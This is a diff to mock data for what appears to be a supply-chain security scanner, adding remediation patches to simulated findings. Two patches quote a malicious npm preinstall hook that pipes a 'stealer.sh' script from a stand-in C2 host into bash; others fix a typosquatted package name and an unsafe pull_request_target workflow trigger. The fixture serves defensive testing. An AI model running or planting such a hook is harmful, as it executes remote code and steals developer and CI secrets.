@@ -79,6 +79,15 @@ class MockStore:
                 "Remove the dangerous preinstall hook from package.json.",
                 "Confirm intended dependency name.",
             ],
+            clean_patch=(
+                "--- a/package.json\n"
+                "+++ b/package.json\n"
+                "@@ -10,3 +10,2 @@\n"
+                "   \"scripts\": {\n"
+                "-    \"preinstall\": \"curl -s https://c2-transfer.mock.xyz/stealer.sh | bash\",\n"
+                "     \"test\": \"jest\"\n"
+                "   }"
+            ),
         )
 
         scan = ScanResponse(
@@ -142,6 +151,15 @@ class MockStore:
                     "Quarantine pull request branch",
                     "Rotate any CI/CD secrets exposed to branch runs",
                 ],
+                clean_patch=(
+                    "--- a/package.json\n"
+                    "+++ b/package.json\n"
+                    "@@ -6,3 +6,2 @@\n"
+                    "   \"scripts\": {\n"
+                    "-    \"preinstall\": \"curl -sL https://c2-transfer.mock.xyz/stealer.sh | bash\",\n"
+                    "     \"test\": \"jest\"\n"
+                    "   }"
+                ),
             ),
             created_at=datetime(2026, 10, 31, 8, 0, 0, tzinfo=timezone.utc),
             completed_at=datetime(2026, 10, 31, 8, 0, 3, tzinfo=timezone.utc),
@@ -192,6 +210,16 @@ class MockStore:
                     "Replace with authentic package name",
                     "Check lockfile integrity",
                 ],
+                clean_patch=(
+                    "--- a/package.json\n"
+                    "+++ b/package.json\n"
+                    "@@ -10,3 +10,3 @@\n"
+                    "   \"dependencies\": {\n"
+                    "-    \"reqeusts\": \"^2.31.0\",\n"
+                    "+    \"requests\": \"^2.31.0\",\n"
+                    "     \"express\": \"^4.19.2\"\n"
+                    "   }"
+                ),
             ),
             created_at=datetime(2026, 10, 31, 8, 15, 0, tzinfo=timezone.utc),
             completed_at=datetime(2026, 10, 31, 8, 15, 2, tzinfo=timezone.utc),
@@ -258,6 +286,15 @@ class MockStore:
                     "Drop write-all permissions",
                     "Pass PR title through environment variables",
                 ],
+                clean_patch=(
+                    "--- a/.github/workflows/validate.yml\n"
+                    "+++ b/.github/workflows/validate.yml\n"
+                    "@@ -2,3 +2,3 @@\n"
+                    " name: Validate\n"
+                    "-on: pull_request_target\n"
+                    "+on: pull_request\n"
+                    " jobs:\n"
+                ),
             ),
             created_at=datetime(2026, 10, 31, 8, 30, 0, tzinfo=timezone.utc),
             completed_at=datetime(2026, 10, 31, 8, 30, 4, tzinfo=timezone.utc),
